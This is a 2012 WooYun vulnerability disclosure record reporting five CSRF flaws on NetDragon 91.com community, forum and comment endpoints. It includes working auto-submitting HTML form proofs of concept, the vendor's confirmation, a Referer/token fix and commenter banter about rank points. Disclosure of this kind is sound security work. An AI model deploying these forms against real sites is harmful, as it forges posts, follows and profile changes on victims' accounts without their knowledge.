{"id": 18702, "wybug_id": "wooyun-2012-08367", "wybug_title": "福建网龙旗下某站CSRF礼包", "wybug_corp": "福建网龙", "wybug_author": "imlonghao", "wybug_date": "2012-06-16 17:12", "wybug_open_date": "2012-07-31 17:13", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-07-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-31：\t细节向公众公开  简要描述： 福建网龙旗下某处CSRF漏洞，可能导致蠕虫蔓延 详细说明：  在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。   漏洞证明：  【第一处】漏洞地址：http://t.91.com/broadcast/add\n<html><body><form id=\"imlonghao\" name=\"imlonghao\" action=\"http://t.91.com/broadcast/add\" method=\"post\"><input type=\"text\" name=\"tid\" value=\"\" /><input type=\"text\" name=\"content\" value=\"XX\" /><input type=\"text\" name=\"secret\" value=\"0\" /><input type=\"text\" name=\"video\" value=\"\" /><input type=\"text\" name=\"upimg\" value=\"\" /><input type=\"submit\" value=\"submit\" /></form><script>\tdocument.imlonghao.submit();</script></body></html>\n可能会导致未经用户知情下在91社区中发布广播=========华丽的分割线=========【第二处】漏洞地址：http://t.91.com/\n<html><body><form id=\"imlonghao\" name=\"imlonghao\" action=\"http://t.91.com/\" method=\"get\"><input type=\"text\" name=\"controller\" value=\"friend\" /><input type=\"text\" name=\"action\" value=\"follow\" /><input type=\"text\" name=\"fid\" value=\"145243793\" /><input type=\"submit\" value=\"submit\" /></form><script>\tdocument.imlonghao.submit();</script></body></html>\n可能会导致在用户为知情的情况下关注某人=========华丽的分割线=========【第三处】漏洞地址：http://bbs.91.com/member/sign\n<html><body><form id=\"imlonghao\" name=\"imlonghao\" action=\"http://bbs.91.com/member/sign\" method=\"post\"><input type=\"text\" name=\"user_sign\" value=\"XXXX\" /><input type=\"submit\" value=\"submit\" /></form><script>\tdocument.imlonghao.submit();</script></body></html>\n可能会在用户未知情的情况下修改论坛签名档（这个POST原本还有一个name=submit，后来居然冲突，以为删掉不行，谁知道还是可以POST的。。）=========华丽的分割线=========【第四处】漏洞地址：http://pz.91.com/port/comment_action.php\n<html><body><form id=\"imlonghao\" name=\"imlonghao\" action=\"http://pz.91.com/port/comment_action.php\" method=\"post\"><input type=\"text\" name=\"content\" value=\"羡慕啊，那么多装备！！！\" /><input type=\"text\" name=\"name\" value=\"游客\" /><input type=\"text\" name=\"vericode\" value=\"\" /><input type=\"text\" name=\"comment\" value=\"http://pz.91.com/html/2012/24/15/18428/index.htm\" /><input type=\"text\" name=\"title\" value=\"魔域玩家大晒极品装备\" /><input type=\"text\" name=\"backUrl\" value=\"http://news.91.com/comment/ocommentsend.htm\" /><input type=\"text\" name=\"url\" value=\"#\" /><input type=\"text\" name=\"defind\" value=\"\" /><input type=\"text\" name=\"charset_from\" value=\"gbk\" /><input type=\"submit\" value=\"submit\" /></form><script>\tdocument.imlonghao.submit();</script></body></html>\n可能会在用户未知情的情况下，在引用了这个评论框的地址发布评论，影响范围大=========华丽的分割线=========【第五处】漏洞地址：http://t.91.com/broadcast/rebroadcast\n<html><body><form id=\"imlonghao\" name=\"imlonghao\" action=\"http://t.91.com/broadcast/rebroadcast\" method=\"post\"><input type=\"text\" name=\"ownermbrid\" value=\"485158345\" /><input type=\"text\" name=\"oldbrtid\" value=\"631\" /><input type=\"text\" name=\"curr_uid\" value=\"485158345\" /><input type=\"text\" name=\"curr_brtid\" value=\"631\" /><input type=\"text\" name=\"content\" value=\"XX\" /><input type=\"submit\" value=\"submit\" /></form><script>\tdocument.imlonghao.submit();</script></body></html>\n可能会导致在用户未知情的情况下转发广播   修复方案：  检查POST来路Referer在POST的信息中加token   版权声明：转载请注明来源 imlonghao@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-06-18 10:13 厂商回复： 感谢imlonghao提交的漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-06-16 18:15 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  我擦。人家刚注册就整这么大礼品    \n     2012-06-16 18:26 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @zeracker 哈哈，咱太对不起人家了，我这里有5个XSRF，哈哈，忙死程序员    \n     2012-06-16 18:27 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  csrf    \n     2012-06-16 19:30 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @imlonghao 伤不起    \n     2012-06-16 21:43 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  = = 各种漏洞都来了。。 我在想。。要不要去找网龙的XSS    \n     2012-06-16 21:56 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @gainover — — ，人家刚来，就这样热情，别把人家公司的人吓坏了    \n     2012-06-16 21:59 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @zeracker @xsser 到时乌云可以以这个对外宣传，注册乌云，1000多名白帽子为您解决安全问题，让你绝无后顾之忧！！哈哈哈！    \n     2012-06-16 22:03 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @zeracker @imlonghao = = 。。有头脑。    \n     2012-06-16 22:06 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @gainover @zeracker 小二要小心啊，50分的差距。。    \n     2012-06-16 22:36 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @imlonghao 俺还有2个洞。30分。再说，一切都都是浮云    \n     2012-06-16 23:46 |    \t\tpfdz \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:13        | Stay hungry. Stay foolish.)\t\t \n  @imlonghao 是t社区的？    \n     2012-06-17 05:41 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @pfdz 我只逛乌云。    \n     2012-06-17 14:00 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @imlonghao = = 他应该问的是，你的漏洞是不是t.91.com的吧？    \n     2012-06-17 15:36 |    \t\tpfdz \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:13        | Stay hungry. Stay foolish.)\t\t \n  @gainover 说对了。。    \n     2012-06-17 21:58 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @pfdz @gainover 嗯    \n     2012-06-18 10:22 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  @imlonghao 你太坏了 周末都不让程序员休息 你看看程序员已经多不容易了 呵呵    \n     2012-06-18 22:12 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  让我情何以堪，给10RANK换了5个CSRF，2R一个？    \n     2012-07-19 13:39 |    \t\tLittlePig \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | </html>)\t\t \n  @imlonghao 下次拆开报。估计每个都至少拿5R~    \n     2012-07-19 15:09 |    \t\timlonghao \t\t\t( 普通白帽子  |\t\t\t        Rank:730 漏洞数:74        )\t\t \n  @LittlePig 会拉平均的亲。。    \n     2012-07-19 21:21 |    \t\tLittlePig \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | </html>)\t\t \n  @imlonghao ……好吧    \n     2012-08-01 07:44 |    \t\t245661320 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:3        | 永无边境的黑暗！)\t\t \n  @gainover 你让人家情何以堪啊…    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}